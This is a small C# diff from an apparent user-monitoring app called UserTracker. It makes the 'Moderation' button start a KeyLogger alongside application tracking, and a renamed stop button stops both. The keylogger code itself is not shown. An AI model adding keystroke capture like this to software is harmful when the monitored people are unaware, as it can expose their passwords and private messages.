@@ -21,11 +21,13 @@ namespace UserTracker
         private void btnModeration_Click(object sender, EventArgs e)
         {
             AppTracker.StartMonitoringAsync();
+            KeyLogger.StartLoggingAsync();
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private void btnStopModeration_Click(object sender, EventArgs e)
         {
             AppTracker.StopMonitoring();
+            KeyLogger.StopLogging();
         }
 
         private void btnReports_Click(object sender, EventArgs e)
